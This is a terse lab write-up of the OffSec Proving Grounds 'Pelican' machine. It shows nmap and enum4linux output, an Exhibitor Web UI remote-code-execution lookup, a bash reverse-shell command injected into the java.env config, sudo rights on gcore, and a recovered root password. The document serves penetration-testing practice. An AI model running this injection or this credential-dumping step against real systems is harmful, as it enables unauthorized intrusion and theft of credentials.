---
layout: post
title:  "Write Up: Proving Grounds Practice - Pelican"
date:   2024-07-24 12:23:57 -0400
categories: oscp proving-grounds TJNull
---


192.168.174.98
me: 192.168.45.213

# Nmap 7.94SVN scan initiated Wed Jul 24 17:05:07 2024 as: nmap -sV -sC -p- -oA Pelican 192.168.174.98
Nmap scan report for 192.168.174.98
Host is up (0.11s latency).
Not shown: 65505 closed tcp ports (reset)
PORT      STATE    SERVICE       VERSION
22/tcp    open     ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
139/tcp   open     netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open     netbios-ssn   Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp   open     ipp           CUPS 2.2
|_http-title: Forbidden - CUPS v2.2.10
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/2.2 IPP/2.1
2181/tcp  open     zookeeper     Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open     ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
3268/tcp  filtered globalcatLDAP
4525/tcp  filtered unknown
7352/tcp  filtered swx
8080/tcp  open     http          Jetty 1.0
|_http-server-header: Jetty(1.0)
|_http-title: Error 404 Not Found
8081/tcp  open     http          nginx 1.14.2
|_http-title: Did not follow redirect to http://192.168.174.98:8080/exhibitor/v1/ui/index.html
|_http-server-header: nginx/1.14.2
8729/tcp  filtered unknown
10385/tcp filtered unknown
12493/tcp filtered unknown
23868/tcp filtered unknown
28609/tcp filtered unknown
29322/tcp filtered unknown
29455/tcp filtered unknown
32321/tcp filtered unknown
34107/tcp filtered unknown
37753/tcp open     java-rmi      Java RMI
42413/tcp filtered unknown
42793/tcp filtered unknown
46755/tcp filtered unknown
47056/tcp filtered unknown
50677/tcp filtered unknown
53556/tcp filtered unknown
57571/tcp filtered unknown
58602/tcp filtered unknown
60020/tcp filtered unknown
Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h19m19s, deviation: 2h18m34s, median: -41s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: pelican
|   NetBIOS computer name: PELICAN\x00
|   Domain name: \x00
|   FQDN: pelican
|_  System time: 2024-07-24T17:10:33-04:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-07-24T21:10:35
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 24 17:11:20 2024 -- 1 IP address (1 host up) scanned in 373.60 seconds

============================================================================================================================
CUPS v2.2.10

============================================================================================================================

port 8081

┌──(kali㉿kali)-[~/offsec/pg-practice/Pelican]
└─$ searchsploit exhibitor
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Exhibitor Web UI 1.7.1 - Remote Code Execution                                    | java/webapps/48654.txt
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                    
┌──(kali㉿kali)-[~/offsec/pg-practice/Pelican]
└─$ searchsploit -m 48654.txt
  Exploit: Exhibitor Web UI 1.7.1 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/48654
     Path: /usr/share/exploitdb/exploits/java/webapps/48654.txt
    Codes: CVE-2019-5029
 Verified: False
File Type: Unicode text, UTF-8 text, with very long lines (888)
Copied to: /home/kali/offsec/pg-practice/Pelican/48654.txt


go under config > click editing on > paste the following in java.env script: $(bash -i >& /dev/tcp/192.168.45.213/4444 0>&1)

click commit and then wait a min.....



charles@pelican:/opt/zookeeper/conf$ cat zoo.cfg
cat zoo.cfg
#Auto-generated by Exhibitor - Wed Jul 24 17:38:02 EDT 2024
#Wed Jul 24 17:38:02 EDT 2024
server.1=pelican\:2888\:3888
dataDir=/zookeeper/data
tickTime=2000
initLimit=10
clientPort=2181
syncLimit=5
dataLogDir=/zookeeper/data


charles@pelican:/opt/zookeeper$ sudo -l
sudo -l
Matching Defaults entries for charles on pelican:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore


001 Password: root:
ClogKingpinInning731



============================================================================================================================
enum4linux -a 192.168.174.98

┌──(kali㉿kali)-[~]
└─$ enum4linux -a 192.168.174.98
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jul 24 17:28:17 2024

 =========================================( Target Information )=========================================

Target ........... 192.168.174.98
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 192.168.174.98 )===========================


[E] Can't find workgroup/domain



 ===============================( Nbtstat Information for 192.168.174.98 )===============================

Looking up status of 192.168.174.98
No reply from 192.168.174.98

 ==================================( Session Check on 192.168.174.98 )==================================


[+] Server 192.168.174.98 allows sessions using username '', password ''


 ===============================( Getting domain SID for 192.168.174.98 )===============================

Domain Name: WORKGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup


 ==================================( OS information on 192.168.174.98 )==================================


[E] Can't get OS info with smbclient

                                                                                                                    
[+] Got OS info for 192.168.174.98 from srvinfo:                                                                    
        PELICAN        Wk Sv PrQ Unx NT SNT Samba 4.9.5-Debian                                                      
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 ======================================( Users on 192.168.174.98 )======================================
                                                                                                                    
Use of uninitialized value $users in print at ./enum4linux.pl line 972.                                             
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.

 ================================( Share Enumeration on 192.168.174.98 )================================
                                                                                                                    
                                                                                                                    
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            

[+] Attempting to map shares on 192.168.174.98                                                                      
                                                                                                                    
//192.168.174.98/print$ Mapping: DENIED Listing: N/A Writing: N/A                                                   

[E] Can't understand response:                                                                                      
                                                                                                                    
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                          
//192.168.174.98/IPC$   Mapping: N/A Listing: N/A Writing: N/A

 ===========================( Password Policy Information for 192.168.174.98 )===========================
                                                                                                                    
                                                                                                                    

[+] Attaching to 192.168.174.98 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] PELICAN
        [+] Builtin

[+] Password Info for Domain: PELICAN

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:                                                                
                                                                                                                    
                                                                                                                    
Password Complexity: Disabled                                                                                       
Minimum Password Length: 5


 ======================================( Groups on 192.168.174.98 )======================================
                                                                                                                    
                                                                                                                    
[+] Getting builtin groups:                                                                                         
                                                                                                                    
                                                                                                                    
[+]  Getting builtin group memberships:                                                                             
                                                                                                                    
                                                                                                                    
[+]  Getting local groups:                                                                                          
                                                                                                                    
                                                                                                                    
[+]  Getting local group memberships:                                                                               
                                                                                                                    
                                                                                                                    
[+]  Getting domain groups:                                                                                         
                                                                                                                    
                                                                                                                    
[+]  Getting domain group memberships:                                                                              
                                                                                                                    
                                                                                                                    
 =================( Users on 192.168.174.98 via RID cycling (RIDS: 500-550,1000-1050) )=================
                                                                                                                   
                                                                                                                    
[I] Found new SID:                                                                                                  
S-1-22-1                                                                                                            

[I] Found new SID:                                                                                                  
S-1-5-32                                                                                                            

[I] Found new SID:                                                                                                  
S-1-5-32                                                                                                            

[I] Found new SID:                                                                                                  
S-1-5-32                                                                                                            

[I] Found new SID:                                                                                                  
S-1-5-32                                                                                                            

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                         
                                                                                                                    
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                   
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

